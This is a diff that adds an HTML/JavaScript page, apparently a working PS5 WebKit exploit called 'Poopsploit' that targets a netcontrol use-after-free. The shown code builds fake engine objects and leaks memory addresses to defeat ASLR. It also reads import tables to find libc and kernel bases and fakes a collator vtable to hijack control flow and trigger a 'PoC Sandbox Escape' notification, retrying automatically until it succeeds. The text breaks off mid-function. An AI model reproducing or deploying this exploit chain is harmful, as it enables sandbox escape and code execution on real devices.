@@ -1,0 +1,2278 @@
+<!doctype html>
+<meta charset="utf-8"><title>PS5 Poopsploit (netcontrol UAF)</title>
+<style>
+html, body { margin: 0; min-height: 100%; background: #0c0c0f; }
+body {
+    color: #cccccc;
+    font-family: Arial, sans-serif;
+    display: flex; flex-direction: column; align-items: center;
+    padding: 18px 12px 8px 12px;
+}
+#cap {
+    font-size: 26px; font-weight: 800; letter-spacing: 1px;
+    text-align: center; margin-bottom: 12px; color: #ffffff;
+}
+#cat {
+    width: 260px; max-width: 72vw; border-radius: 10px; display: block;
+    box-shadow: 0 0 0 2px #2a2a2e, 0 0 22px 4px #2a2a2e;
+    transition: box-shadow 0.4s ease;
+}
+#cat { border: 4px solid transparent; }
+#cat.run { animation: pulse 1.1s ease-in-out infinite; }
+#cat.ok  { border-color: #16c60c; box-shadow: 0 0 0 2px #16c60c, 0 0 40px 10px rgba(22,198,12,0.75); animation: none; }
+#cat.bad { border-color: #e74856; box-shadow: 0 0 0 2px #e74856, 0 0 34px 8px rgba(231,72,86,0.6); animation: none; }
+@keyframes pulse {
+    0%,100% { box-shadow: 0 0 0 2px #35507a, 0 0 16px 3px rgba(53,80,122,0.5); }
+    50%     { box-shadow: 0 0 0 2px #4f7fd6, 0 0 30px 8px rgba(79,127,214,0.7); }
+}
+#status {
+    font-size: 17px; font-weight: bold; letter-spacing: 1px;
+    text-align: center; margin: 14px 0 4px 0; min-height: 1.2em;
+}
+#scr {
+    margin: 8px 0 0 0; white-space: pre; color: #5a5a5a; font-size: 11px;
+    font-family: "Consolas", monospace; max-width: 92vw; overflow: hidden;
+    text-align: center; line-height: 1.35;
+}
+.ok { color: #16c60c; }
+.bad { color: #e74856; }
+.run { color: #cccccc; }
+/* On-screen log. screenLine() has always written to #scr, but the element
+   was never in the body, so every line was swallowed by its try/catch and
+   the console showed nothing but the cat. */
+#scr {
+  /* FIXED geometry. The page's original #scr rule had no width and
+     white-space:pre, so the box grew and shrank with the longest line - it
+     jumped around as phases scrolled past. Pin width AND height so it is a
+     stable panel regardless of content. */
+  box-sizing: border-box;
+  width: 92vw; max-width: 92vw;
+  margin: 12px auto 0; padding: 8px 10px;
+  height: 40vh; min-height: 40vh; max-height: 40vh; overflow-y: auto;
+  background: #101010; color: #d0d0d0; border: 1px solid #333;
+  font: 12px/1.35 monospace; text-align: left; white-space: pre-wrap;
+  word-break: break-all;
+}
+</style>
+<body>
+<div id="cap">PS5 Poopsploit &mdash; netcontrol UAF</div>
+<img id="cat" class="run" src="cat.jpg" alt="">
+<pre id="scr">waiting...</pre>
+<script>
+"use strict";
+
+const Q = new URLSearchParams(location.search);
+
+function intParam(name, fallback, lo, hi) {
+    const raw = parseInt(Q.get(name) ?? "", 10);
+    return Number.isFinite(raw) ? Math.max(lo, Math.min(hi, raw)) : fallback;
+}
+
+function hexParam(name, fallback) {
+    const v = Q.get(name);
+    if (!v) return fallback;
+    const raw = parseInt(v, 16);
+    return Number.isFinite(raw) && raw > 0 ? raw : fallback;
+}
+
+// Comma-separated hex list, e.g. hc=0x34f98,0x35808,0x35900. The base anchor
+// has several candidate thunks per build; the correct one is picked at runtime
+// as the one yielding a page-aligned webkitBase.
+function hexListParam(name, fallback) {
+    const v = Q.get(name);
+    if (!v) return fallback;
+    const out = [];
+    for (const part of v.split(",")) {
+        const raw = parseInt(part, 16);
+        if (Number.isFinite(raw) && raw > 0) out.push(raw);
+    }
+    return out.length ? out : fallback;
+}
+
+// Per-firmware offsets. Defaults are the hardware-verified 11.60 values; the
+// launcher supplies the correct set for 9.00-13.20 via query params.
+const P_HOST_CTOR_LIST = hexListParam("hc", [0x1e0d8, 0x1e320, 0x1f368]);
+const P_NOTIFY = hexParam("notify", 0x4740);
+const P_GADGET = hexParam("gd", 0x1d11a);
+const P_GETPID_SLOT = hexParam("gps", 0x34f57b8);
+const P_GETPID_EXP = hexParam("gpe", 0x1b280);
+const P_CLOSE_SLOT = hexParam("cls", 0x34f57a8);
+const P_CLOSE_EXP = hexParam("cle", 0x26e70);
+const P_ERROR_SLOT = hexParam("ers", 0x34f57b0);
+const P_ERROR_EXP = hexParam("ere", 0xf340);
+
+const DRAIN_COUNT = intParam("n", 512, 64, 1024);
+
+const REVISION = "renderer-notify-auto-proof-2";
+const AUTO_RETRY_DELAY_MS = intParam("rd", 50, 0, 60000);
+const MAX_ATTEMPTS = intParam("max", 0, 0, 1000000);
+const SCREEN_LINES = intParam("lines", 26, 0, 400);   // a full run emits ~18 phase beacons
+const K = 2;
+const DUPLICATE_INDEX = 2;
+const CONTROL_INDEX = 0xffff;
+const CONTROL_INT = -64000;
+const FILLER_BIGINTS = K - 1;
+const FILLER_OBJECTS = 0xfffe - K;
+const EXPECTED_LENGTH = 0x50001;
+const CELL_BYTES = 0x30;
+const FUNCTION_BYTES = 0x20;
+const NATIVE_EXECUTABLE_BYTES = 0x38;
+const HOLDER_BYTES = 0x40;
+const ARENA_VIEW_BYTES = 0x30;
+const COLLATOR_BYTES = 0x38;
+const BOUND_COMPARE_BYTES = 0x20;
+const PARSEINT_NATIVE_OFFSET = 0x1ea18;
+let HOST_CONSTRUCTOR_OFFSET = P_HOST_CTOR_LIST[0];
+const WEBKIT_TEXT_SIZE = 0x2c7c000;
+
+const WEBKIT_RELRO_START = 0x32d8000;
+const WEBKIT_RELRO_END = 0x34f7e48;
+const IMPORT_WINDOW_A_OFFSET = 0x34f5708;
+const IMPORT_WINDOW_A_BYTES = 0xd0;
+const IMPORT_WINDOW_B_OFFSET = 0x34f5860;
+const IMPORT_WINDOW_B_BYTES = 0x38;
+
+const REQUIREMENTS_OBJECT_A_SLOT = 0x00;
+const REQUIREMENTS_OBJECT_A_OFFSET = 0x29f350;
+const REQUIREMENTS_OBJECT_B_SLOT = 0x08;
+const REQUIREMENTS_OBJECT_B_OFFSET = 0x29f348;
+const KERNEL_OBJECT_SLOT = 0x10;
+const KERNEL_OBJECT_OFFSET = 0x6d1d0;
+const CXA_FINALIZE_SLOT = 0x40;
+const CXA_FINALIZE_OFFSET = 0x173e0;
+const STRLEN_SLOT = 0x70;
+const STRLEN_OFFSET = 0x44c0;
+const CLOSE_SLOT = 0xa0;
+const CLOSE_OFFSET = 0x26e70;
+const ERROR_SLOT = 0xa8;
+const ERROR_OFFSET = 0xf340;
+const GETPID_SLOT = 0xb0;
+const GETPID_OFFSET = 0x1b280;
+const STRERROR_SLOT = 0xc8;
+const STRERROR_OFFSET = 0x77070;
+const PTHREAD_GETSPECIFIC_SLOT = 0x00;
+const PTHREAD_GETSPECIFIC_OFFSET = 0x40dd0;
+const MEMCHR_SLOT = 0x30;
+const MEMCHR_OFFSET = 0x3c40;
+const LIBC_TEXT_SIZE = 0x128000;
+const KERNEL_TEXT_SIZE = 0x44000;
+
+const NATURAL_TRAMPOLINE_OFFSET = P_GADGET;
+const NOTIFY_OFFSET = P_NOTIFY;
+const NOTIFICATION_REQUEST_SIZE = 0xc30;
+const NOTIFICATION_MESSAGE_OFFSET = 0x2d;
+const NOTIFICATION_MESSAGE = "PoC Sandbox Escape";
+const ARENA_BYTES = 0x1000;
+const FAKE_UCOLLATOR_OFFSET = 0x100;
+const FAKE_VTABLE_OFFSET = 0x300;
+
+const CARRIER_SLOTS = 9000000;
+const CARRIER_BYTES = CARRIER_SLOTS * 8;
+const CAPTURE_DELAY_MS = intParam("cap", 50, 0, 60000);
+const COMPOSE_DELAY_MS = CAPTURE_DELAY_MS + intParam("gap", 50, 0, 60000);
+const symbolToString = Symbol.prototype.toString;
+
+const DRAIN_SIZE = 0x10000;
+const SLAB_SIZE = 0x400000;
+const BUTTERFLY_HOLE_SIZE = 0x81000;
+const SEPARATOR_SIZE = 0x10000;
+const EARLY_HOLE_SIZE = 0x70000;
+const GUARD_SIZE = 0x90000;
+const PREDECESSOR_SIZE = 0x80000;
+const FINAL_HOLE_SIZE = 0x80000;
+
+const rwHeader = new Uint8Array(CELL_BYTES);
+const targetHeader = new Uint8Array(NATIVE_EXECUTABLE_BYTES);
+const holderHeader = new Uint8Array(HOLDER_BYTES);
+const arenaViewHeader = new Uint8Array(ARENA_VIEW_BYTES);
+const collatorHeader = new Uint8Array(COLLATOR_BYTES);
+const compareFnHeader = new Uint8Array(BOUND_COMPARE_BYTES);
+const collatorOriginal = new Uint8Array(COLLATOR_BYTES - 0x18);
+const importWindowA1 = new Uint8Array(IMPORT_WINDOW_A_BYTES);
+const importWindowA2 = new Uint8Array(IMPORT_WINDOW_A_BYTES);
+const importWindowB1 = new Uint8Array(IMPORT_WINDOW_B_BYTES);
+const importWindowB2 = new Uint8Array(IMPORT_WINDOW_B_BYTES);
+const scratchBits = new ArrayBuffer(8);
+const scratchBytes = new Uint8Array(scratchBits);
+const scratchWords = new Uint32Array(scratchBits);
+const scratchDouble = new Float64Array(scratchBits);
+
+const navigationID = Date.now().toString(36);
+const autoMode = Q.get("auto") !== "0";
+const allowAgain = /(?:^|[?&])again=1(?:&|$)/.test(location.search);
+const armed = Q.get("go") === "1";
+const attemptKey = `${REVISION}:attempts`;
+const passKey = `${REVISION}:passed`;
+const blockKey = `${REVISION}:blocked`;
+
+let priorAttempts = 0;
+let alreadyPassed = false;
+let alreadyBlocked = false;
+try {
+    priorAttempts = parseInt(sessionStorage.getItem(attemptKey) ?? "0", 10);
+    if (!Number.isFinite(priorAttempts) || priorAttempts < 0)
+        priorAttempts = 0;
+    alreadyPassed = sessionStorage.getItem(passKey) === "1";
+    alreadyBlocked = sessionStorage.getItem(blockKey) === "1";
+} catch {}
+
+let attemptNumber = priorAttempts + 1;
+let seq = 0;
+let keepIndex = 0;
+let stopped = false;
+let keepAlive = null;
+const screenLines = [];
+
+let referenceTarget = null;
+let rwBuffer = null;
+let rwView = null;
+let rwMirror = null;
+let targetBuffer = null;
+let targetView = null;
+let nativeTarget = parseInt;
+let fakeHost = null;
+let lengthWord = null;
+let arenaBuffer = null;
+let arenaView = null;
+let realCollator = null;
+let compareFn = null;
+let notificationRequest = "";
+let notificationRequestOK = false;
+let notificationPrewarmResult = 0;
+let targetHolder = null;
+let holderGuardA = null;
+let holderGuardB = null;
+let fillerGraph = null;
+let outerGraph = null;
+
+let leakedScope = null;
+let getterCarrier = null;
+let preparedSymbolObject = null;
+let capturedString = null;
+let capturedWords = null;
+let copiedLength = 0;
+let captureState = 0;
+let captureError = null;
+let hostAddress = NaN;
+let fakeAddress = NaN;
+
+let predecessorWords = null;
+let pointerLow = 0;
+let pointerHigh = 0;
+let targetAddress = NaN;
+let targetAddressLow = 0;
+let targetAddressHigh = 0;
+let nativeTargetAddress = NaN;
+let arenaViewAddress = NaN;
+let realCollatorAddress = NaN;
+let compareFnAddress = NaN;
+
+let rwOriginalVector = NaN;
+let rwHeaderOK = false;
+let functionHeaderOK = false;
+let nativeExecutableHeaderOK = false;
+let functionStructureID = 0;
+let nativeExecutableStructureID = 0;
+let executableAddress = NaN;
+let nativeFunctionAddress = NaN;
+let nativeConstructorAddress = NaN;
+let webkitBase = NaN;
+let webkitBaseOK = false;
+let pointersRepeated = false;
+let restoreObserved = false;
+let retrySafe = false;
+let retryScheduled = false;
+let attemptPersisted = false;
+let candidateEverReturned = false;
+let candidateMutationStarted = false;
+let zeroHeaderMiss = false;
+let gotReadAttempted = false;
+let gotWindowAddressesOK = false;
+let gotWindowsRepeated = false;
+let gotCanonicalOK = false;
+let gotReadOK = false;
+
+let requirementsObjectA = 0;
+let requirementsObjectB = 0;
+let requirementsBase = NaN;
+let requirementsBaseOK = false;
+let kernelObjectPointer = 0;
+let kernelObjectBase = NaN;
+let kernelObjectBaseOK = false;
+
+let cxaFinalizePointer = 0;
+let strlenPointer = 0;
+let strerrorPointer = 0;
+let memchrPointer = 0;
+let closePointer = 0;
+let errorPointer = 0;
+let getpidPointer = 0;
+let pthreadGetspecificPointer = 0;
+let cxaFinalizeStatus = 0;
+let strlenStatus = 0;
+let strerrorStatus = 0;
+let memchrStatus = 0;
+let closeStatus = 0;
+let errorStatus = 0;
+let getpidStatus = 0;
+let pthreadGetspecificStatus = 0;
+let libcBase = NaN;
+let libcResolvedCount = 0;
+let libcBaseOK = false;
+let kernelBase = NaN;
+let kernelResolvedCount = 0;
+let kernelBaseOK = false;
+
+let holderHeaderOK = false;
+let arenaViewHeaderOK = false;
+let collatorHeaderOK = false;
+let compareFnHeaderOK = false;
+let arenaBacking = NaN;
+let arenaBackingRepeated = false;
+let fakeUCollatorAddress = NaN;
+let fakeVtableAddress = NaN;
+let naturalTrampolineAddress = NaN;
+let notifyEntryAddress = NaN;
+let notifyAddressOK = false;
+let arenaLayoutOK = false;
+let arenaFilledOK = false;
+let carrierArmedForCommit = false;
+let notifyReady = false;
+let commitStarted = false;
+let commitBlockConfirmed = false;
+
+let compositionState = 0;
+let compositionLength = 0;
+let compositionError = null;
+
+const FW_LABEL = (function () {
+    const p = Q.get("fw");
+    if (p) return p;
+    const m = /PlayStation 5\/(\d+\.\d+)/.exec(navigator.userAgent);
+    return m ? m[1] : "??.??";
+})();
+
+function setCaption(text) {
+    try { document.getElementById("cap").textContent = text; } catch {}
+}
+
+function catState(cls) {
+    try { document.getElementById("cat").className = cls; } catch {}
+}
+
+setCaption(`Poopsploit — PS5 FW ${FW_LABEL}`);
+
+function screenLine(text) {
+    screenLines.push(text.length > 110 ? `${text.slice(0, 107)}...` : text);
+    if (screenLines.length > SCREEN_LINES)
+        screenLines.splice(0, screenLines.length - SCREEN_LINES);
+    try {
+        const _el = document.getElementById("scr");
+        _el.textContent = screenLines.join(String.fromCharCode(10));
+        _el.scrollTop = _el.scrollHeight;
+    } catch {}
+}
+
+// Diagnostic beacons to the lab server's /log endpoint. Auto-disabled on a
+// static host (e.g. GitHub Pages) where /log does not exist; force with ?log=1.
+const LOG_ON = Q.get("log") === "1"
+    || (Q.get("log") !== "0" && !/github\.io$/i.test(location.hostname));
+
+function mark(tag, extra) {
+    seq++;
+    const line = `a${attemptNumber}-r${navigationID}-s${seq}-note-${tag}`
+        + (extra !== undefined ? `-${extra}` : "");
+    if (LOG_ON) {
+        try {
+            const xhr = new XMLHttpRequest();
+            xhr.open("GET", `log/${encodeURIComponent(line)}`, false);
+            xhr.send();
+        } catch {}
+    }
+    screenLine(`[${String(attemptNumber).padStart(3, "0")}] ${tag}`
+        + (extra !== undefined ? ` ${extra}` : ""));
+}
+
+function showStatus(text, cls) {
+    try {
+        const node = document.getElementById("status");
+        node.textContent = text;
+        node.className = cls;
+    } catch {}
+}
+
+function failed() {
+    // Relentless mode: never stop for the user. Reset and try again.
+    mark("AUTO-RETRY-AFTER-FAILURE", `attempt=${attemptNumber}`);
+    stopped = false;
+    retryScheduled = false;
+    catState("run");
+    setCaption(`Poopsploit — PS5 FW ${FW_LABEL}`);
+    showStatus(`retrying  (attempt ${attemptNumber + 1})`, "run");
+    setTimeout(() => {
+        try { history.replaceState(null, ""); } catch {}
+        attemptNumber++;
+        startAttempt();
+    }, AUTO_RETRY_DELAY_MS);
+}
+
+function succeeded(detail) {
+    stopped = true;
+    catState("ok");
+    setCaption(`Poopsploit — PS5 FW ${FW_LABEL} - NOTIFICATION SENT`);
+    showStatus(`SUCCESS  (attempt ${attemptNumber})`, "ok");
+    screenLine("");
+    screenLine(`*** SUCCESS *** ${detail}`);
+}
+
+function hex(value) {
+    return `0x${value.toString(16)}`;
+}
+
+function buffer(size) {
+    return new ArrayBuffer(size);
+}
+
+function allZero(bytes, start, end) {
+    for (let i = start; i < end; ++i) {
+        if (bytes[i] !== 0)
+            return false;
+    }
+    return true;
+}
+
+function uint32At(bytes, offset) {
+    return bytes[offset]
+        + bytes[offset + 1] * 0x100
+        + bytes[offset + 2] * 0x10000
+        + bytes[offset + 3] * 0x1000000;
+}
+
+function low48At(bytes, offset) {
+    return bytes[offset]
+        + bytes[offset + 1] * 0x100
+        + bytes[offset + 2] * 0x10000
+        + bytes[offset + 3] * 0x1000000
+        + bytes[offset + 4] * 0x100000000
+        + bytes[offset + 5] * 0x10000000000;
+}
+
+function putLow48(bytes, offset, value) {
+    if (!plausibleAddress(value))
+        throw new Error("putLow48-invalid-value");
+    const high = Math.floor(value / 0x100000000);
+    const low = value - high * 0x100000000;
+    bytes[offset] = low & 0xff;
+    bytes[offset + 1] = Math.floor(low / 0x100) & 0xff;
+    bytes[offset + 2] = Math.floor(low / 0x10000) & 0xff;
+    bytes[offset + 3] = Math.floor(low / 0x1000000) & 0xff;
+    bytes[offset + 4] = high & 0xff;
+    bytes[offset + 5] = Math.floor(high / 0x100) & 0xff;
+    bytes[offset + 6] = 0;
+    bytes[offset + 7] = 0;
+}
+
+function low48StoredExactly(bytes, offset, value) {
+    return low48At(bytes, offset) === value
+        && bytes[offset + 6] === 0 && bytes[offset + 7] === 0;
+}
+
+function readBytes(destination, source, count) {
+    for (let i = 0; i < count; ++i)
+        destination[i] = source[i];
+}
+
+function sameBytes(left, right, count) {
+    for (let i = 0; i < count; ++i) {
+        if (left[i] !== right[i])
+            return false;
+    }
+    return true;
+}
+
+function readTwiceMatches(destination, source, count) {
+    readBytes(destination, source, count);
+    return sameBytes(destination, source, count);
+}
+
+function aimCarrier(candidate, address) {
+    const high = Math.floor(address / 0x100000000);
+    scratchWords[0] = address - high * 0x100000000;
+    scratchWords[1] = high;
+    for (let i = 0; i < 8; ++i)
+        candidate[0x10 + i] = scratchBytes[i];
+}
+
+function restoreCarrier(candidate) {
+    for (let i = 0; i < 8; ++i)
+        candidate[0x10 + i] = rwHeader[0x10 + i];
+}
+
+function pointerFromWords(words, offset) {
+    if (words[offset + 3] !== 0)
+        return NaN;
+    return words[offset]
+        + words[offset + 1] * 0x10000
+        + words[offset + 2] * 0x100000000;
+}
+
+function plausibleCell(value) {
+    return value > 0x100000000
+        && value <= 0xffffffffffff
+        && value <= 9007199254740991
+        && Math.floor(value) === value
+        && value % 8 === 0;
+}
+
+function plausibleAddress(value) {
+    return value > 0x100000000
+        && value <= 0xffffffffffff
+        && value <= 9007199254740991
+        && Math.floor(value) === value;
+}
+
+function canonicalLow48(bytes, offset) {
+    return bytes[offset + 6] === 0 && bytes[offset + 7] === 0;
+}
+
+function inPS5UserModuleBand(value) {
+    return value >= 0x800000000 && value < 0x900000000;
+}
+
+function classifyImportedFunction(value, exportOffset, providerTextSize) {
+    if (value === 0)
+        return 3;
+    if (value >= webkitBase && value < webkitBase + WEBKIT_TEXT_SIZE)
+        return 2;
+    const providerBase = value - exportOffset;
+    if (inPS5UserModuleBand(providerBase)
+        && providerBase % 0x4000 === 0
+        && providerBase !== webkitBase
+        && value >= providerBase
+        && value < providerBase + providerTextSize)
+        return 1;
+    return 0;
+}
+
+function importStatusName(status) {
+    if (status === 1)
+        return "RESOLVED";
+    if (status === 2)
+        return "UNRESOLVED";
+    if (status === 3)
+        return "NULL";
+    return "OTHER";
+}
+
+function dumpHex(bytes, count) {
+    let out = "";
+    for (let i = 0; i < count; ++i)
+        out += bytes[i].toString(16).padStart(2, "0");
+    return out;
+}
+
+function encodedHeaderNumber() {
+    const raw = new ArrayBuffer(8);
+    const u32 = new Uint32Array(raw);
+    const f64 = new Float64Array(raw);
+    u32[0] = 0x00004250;
+    u32[1] = 0x01062800;
+    return f64[0];
+}
+
+function scheduleSafeRetry(reason) {
+    if (retryScheduled || stopped)
+        return;
+    const candidateStateSafe = !candidateEverReturned
+        || (zeroHeaderMiss && !candidateMutationStarted);
+    if (!autoMode || !retrySafe || !candidateStateSafe
+        || candidateMutationStarted || commitStarted
+        || carrierArmedForCommit || alreadyBlocked || !attemptPersisted) {
+        mark("AUTO-RETRY-NOT-SCHEDULED", `reason=${reason}`
+            + `-auto=${autoMode}-safe=${retrySafe}`
+            + `-candidate-seen=${candidateEverReturned}`
+            + `-candidate-mutated=${candidateMutationStarted}`
+            + `-candidate-state-safe=${candidateStateSafe}`
+            + `-commit=${commitStarted}-armed=${carrierArmedForCommit}`
+            + `-preblocked=${alreadyBlocked}`
+            + `-attempt-persisted=${attemptPersisted}`);
+        failed();
+        return;
+    }
+    if (MAX_ATTEMPTS && attemptNumber >= MAX_ATTEMPTS) {
+        mark("ATTEMPT-CEILING", `reason=${reason}-max=${MAX_ATTEMPTS}`);
+        failed();
+        return;
+    }
+
+    retryScheduled = true;
+    const nextAttempt = attemptNumber + 1;
+    mark("AUTO-RETRY-SCHEDULED", `reason=${reason}`
+        + `-next-attempt=${nextAttempt}`
+        + `-delay-ms=${AUTO_RETRY_DELAY_MS}`);
+    setTimeout(() => {
+        let storageStillSafe = false;
+        const candidateStillSafe = !candidateEverReturned
+            || (zeroHeaderMiss && !candidateMutationStarted);
+        try {
+            storageStillSafe = sessionStorage.getItem(passKey) === null
+                && sessionStorage.getItem(blockKey) === null;
+        } catch {}
+        if (!storageStillSafe || !retrySafe || !candidateStillSafe
+            || candidateMutationStarted || commitStarted
+            || carrierArmedForCommit || stopped) {
+            mark("AUTO-RETRY-CANCELLED", `reason=${reason}`
+                + `-storage-safe=${storageStillSafe}`
+                + `-retry-safe=${retrySafe}`
+                + `-candidate-safe=${candidateStillSafe}`
+                + `-candidate-mutated=${candidateMutationStarted}`
+                + `-commit=${commitStarted}`
+                + `-armed=${carrierArmedForCommit}`);
+            failed();
+            return;
+        }
+
+        attemptNumber = nextAttempt;
+        startAttempt();
+    }, AUTO_RETRY_DELAY_MS);
+}
+
+function finishEarlySafeAttempt(tag, extra, reason) {
+    retrySafe = true;
+    mark(tag, `${extra}-retry-safe=true-candidate-seen=false`
+        + "-candidate-mutated=false");
+    scheduleSafeRetry(reason);
+}
+
+function resetAttemptState() {
+    referenceTarget = null;
+    rwBuffer = null;
+    rwView = null;
+    rwMirror = null;
+    targetBuffer = null;
+    targetView = null;
+    fakeHost = null;
+    lengthWord = null;
+    arenaBuffer = null;
+    arenaView = null;
+    realCollator = null;
+    compareFn = null;
+    notificationRequest = "";
+    notificationRequestOK = false;
+    notificationPrewarmResult = 0;
+    targetHolder = null;
+    holderGuardA = null;
+    holderGuardB = null;
+    fillerGraph = null;
+    outerGraph = null;
+    leakedScope = null;
+    getterCarrier = null;
+    preparedSymbolObject = null;
+    capturedString = null;
+    capturedWords = null;
+    copiedLength = 0;
+    captureState = 0;
+    captureError = null;
+    hostAddress = NaN;
+    fakeAddress = NaN;
+    predecessorWords = null;
+    keepAlive = new Array(DRAIN_COUNT + 3);
+    keepIndex = 0;
+    pointerLow = 0;
+    pointerHigh = 0;
+    targetAddress = NaN;
+    targetAddressLow = 0;
+    targetAddressHigh = 0;
+    nativeTargetAddress = NaN;
+    arenaViewAddress = NaN;
+    realCollatorAddress = NaN;
+    compareFnAddress = NaN;
+    rwOriginalVector = NaN;
+    rwHeaderOK = false;
+    functionHeaderOK = false;
+    nativeExecutableHeaderOK = false;
+    functionStructureID = 0;
+    nativeExecutableStructureID = 0;
+    executableAddress = NaN;
+    nativeFunctionAddress = NaN;
+    nativeConstructorAddress = NaN;
+    webkitBase = NaN;
+    webkitBaseOK = false;
+    pointersRepeated = false;
+    restoreObserved = false;
+    retrySafe = false;
+    retryScheduled = false;
+    candidateEverReturned = false;
+    candidateMutationStarted = false;
+    zeroHeaderMiss = false;
+    gotReadAttempted = false;
+    gotWindowAddressesOK = false;
+    gotWindowsRepeated = false;
+    gotCanonicalOK = false;
+    gotReadOK = false;
+    requirementsObjectA = 0;
+    requirementsObjectB = 0;
+    requirementsBase = NaN;
+    requirementsBaseOK = false;
+    kernelObjectPointer = 0;
+    kernelObjectBase = NaN;
+    kernelObjectBaseOK = false;
+    cxaFinalizePointer = 0;
+    strlenPointer = 0;
+    strerrorPointer = 0;
+    memchrPointer = 0;
+    closePointer = 0;
+    errorPointer = 0;
+    getpidPointer = 0;
+    pthreadGetspecificPointer = 0;
+    cxaFinalizeStatus = 0;
+    strlenStatus = 0;
+    strerrorStatus = 0;
+    memchrStatus = 0;
+    closeStatus = 0;
+    errorStatus = 0;
+    getpidStatus = 0;
+    pthreadGetspecificStatus = 0;
+    libcBase = NaN;
+    libcResolvedCount = 0;
+    libcBaseOK = false;
+    kernelBase = NaN;
+    kernelResolvedCount = 0;
+    kernelBaseOK = false;
+    holderHeaderOK = false;
+    arenaViewHeaderOK = false;
+    collatorHeaderOK = false;
+    compareFnHeaderOK = false;
+    arenaBacking = NaN;
+    arenaBackingRepeated = false;
+    fakeUCollatorAddress = NaN;
+    fakeVtableAddress = NaN;
+    naturalTrampolineAddress = NaN;
+    notifyEntryAddress = NaN;
+    notifyAddressOK = false;
+    arenaLayoutOK = false;
+    arenaFilledOK = false;
+    carrierArmedForCommit = false;
+    notifyReady = false;
+    commitStarted = false;
+    commitBlockConfirmed = false;
+    compositionState = 0;
+    compositionLength = 0;
+    compositionError = null;
+    rwHeader.fill(0);
+    targetHeader.fill(0);
+    holderHeader.fill(0);
+    arenaViewHeader.fill(0);
+    collatorHeader.fill(0);
+    compareFnHeader.fill(0);
+    collatorOriginal.fill(0);
+    importWindowA1.fill(0);
+    importWindowA2.fill(0);
+    importWindowB1.fill(0);
+    importWindowB2.fill(0);
+}
+
+function startAttempt() {
+    if (stopped)
+        return;
+    resetAttemptState();
+    showStatus(`RUNNING  attempt ${attemptNumber}`, "run");
+    try {
+        sessionStorage.setItem(attemptKey, String(attemptNumber));
+        attemptPersisted = sessionStorage.getItem(attemptKey)
+            === String(attemptNumber);
+    } catch {}
+    mark("ATTEMPT-START", `attempt-persisted=${attemptPersisted}`
+        + `-auto=${autoMode}-hard-max=${MAX_ATTEMPTS || "none"}`
+        + `-capture-ms=${CAPTURE_DELAY_MS}-compose-ms=${COMPOSE_DELAY_MS}`
+        + `-retry-ms=${AUTO_RETRY_DELAY_MS}`);
+    try {
+        buildAndStoreGraph();
+        prepareAddrof();
+    } catch (error) {
+        finishEarlySafeAttempt("SETUP-THREW",
+            `${error?.name}:${String(error?.message).slice(0, 80)}`,
+            "setup-threw");
+    }
+}
+
+function buildNotificationRequest() {
+    const trailing = NOTIFICATION_REQUEST_SIZE - NOTIFICATION_MESSAGE_OFFSET
+        - NOTIFICATION_MESSAGE.length;
+    if (trailing < 1)
+        throw new Error("notification-message-too-long");
+    notificationRequest = "\x00".repeat(NOTIFICATION_MESSAGE_OFFSET)
+        + NOTIFICATION_MESSAGE + "\x00".repeat(trailing);
+    notificationRequestOK = notificationRequest.length
+        === NOTIFICATION_REQUEST_SIZE;
+    for (let p = 0; p < NOTIFICATION_MESSAGE_OFFSET; ++p) {
+        if (notificationRequest.charCodeAt(p) !== 0)
+            notificationRequestOK = false;
+    }
+    for (let m = 0; m < NOTIFICATION_MESSAGE.length; ++m) {
+        const messageCode = notificationRequest.charCodeAt(
+            NOTIFICATION_MESSAGE_OFFSET + m);
+        if (messageCode !== NOTIFICATION_MESSAGE.charCodeAt(m)
+            || messageCode > 0x7f)
+            notificationRequestOK = false;
+    }
+    for (let t = NOTIFICATION_MESSAGE_OFFSET + NOTIFICATION_MESSAGE.length;
+        t < NOTIFICATION_REQUEST_SIZE; ++t) {
+        if (notificationRequest.charCodeAt(t) !== 0)
+            notificationRequestOK = false;
+    }
+    if (!notificationRequestOK)
+        throw new Error("notification-request-layout-failed");
+}
+
+function leakScopeObject() {
+    class Leaker { leak() { return super.foo; } }
+    Leaker.prototype.__proto__ = new Proxy({}, {
+        get: function (target, property, receiver) { return receiver; }
+    });
+    const leak = Leaker.prototype.leak;
+    return (function () { return leak(); })();
+}
+
+function prepareSymbolWrapper(F) {
+    leakedScope = leakScopeObject();
+    if (leakedScope === undefined || leakedScope === null)
+        throw new Error("scope-not-leaked");
+
+    for (let i = 0; i < 512; i++)
+        leakedScope[`p${i}`] = i;
+    for (let j = 0; j < 8; j++)
+        leakedScope[j] = 1.1 * j;
+
+    Object.defineProperty(leakedScope, "g", { get: F, configurable: true });
+    return Object(leakedScope.g);
+}
+
+function buildFakeHost() {
+    rwBuffer = new ArrayBuffer(0x100);
+    rwView = new Uint8Array(rwBuffer);
+    rwMirror = new Uint8Array(rwBuffer);
+    rwMirror[0] = 0x3c;
+
+    targetBuffer = new ArrayBuffer(0x20);
+    targetView = new Uint8Array(targetBuffer);
+    targetView[0] = 0xa5;
+    lengthWord = { keep: 0x51515151 };
+
+    fakeHost = {
+        q0: encodedHeaderNumber(),
+        q1: 1.1,
+        q2: rwView,
+        q3: lengthWord,
+        q4: 2.2,
+        q5: 3.3
+    };
+
+    delete fakeHost.q1;
+    delete fakeHost.q4;
+    delete fakeHost.q5;
+
+    if (!Number.isFinite(fakeHost.q0) || fakeHost.q2 !== rwView
+        || fakeHost.q3 !== lengthWord || rwView[0] !== 0x3c
+        || targetView[0] !== 0xa5 || typeof nativeTarget !== "function")
+        throw new Error("fake-host-shape-failed");
+
+    arenaBuffer = new ArrayBuffer(ARENA_BYTES);
+    arenaView = new Uint8Array(arenaBuffer);
+    arenaView[0xf00] = 0x52;
+    arenaView[0xf01] = 0x4f;
+    arenaView[0xf02] = 0x50;
+    arenaView[0xf03] = 0x31;
+    realCollator = new Intl.Collator("en", { usage: "search" });
+    compareFn = realCollator.compare;
+    if (!(compareFn("a", "b") < 0))
+        throw new Error("collator-prewarm-failed");
+    buildNotificationRequest();
+    notificationPrewarmResult = compareFn(notificationRequest, "b");
+    if (!Number.isFinite(notificationPrewarmResult))
+        throw new Error("notification-request-prewarm-failed");
+    holderGuardA = { marker: 0x484f4c44 };
+    holderGuardB = { marker: 0x47554152 };
+    targetHolder = {
+        q0: nativeTarget,
+        q1: arenaView,
+        q2: realCollator,
+        q3: compareFn,
+        q4: holderGuardA,
+        q5: holderGuardB
+    };
+
+    if (arenaView.length !== ARENA_BYTES || arenaView[0xf00] !== 0x52
+        || targetHolder.q0 !== nativeTarget || targetHolder.q1 !== arenaView
